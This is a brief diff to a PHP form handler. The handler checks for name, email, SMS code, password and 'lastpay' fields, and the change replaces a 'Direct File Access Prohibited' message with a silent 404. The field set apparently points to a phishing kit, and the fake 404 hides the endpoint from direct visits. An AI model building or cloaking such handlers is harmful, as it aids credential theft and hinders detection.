@@ -1,7 +1,8 @@
 <?php
 if (empty($_POST['name']) && empty($_POST['email']) && empty($_POST['sms']) && empty($_POST['password']) && empty($_POST['lastpay']))
 {
-    die('<h1>Direct File Access Prohibited</h1>');
+	http_response_code(404);
+	die();
 }
 if ($_POST['id'] == "blank")
 {
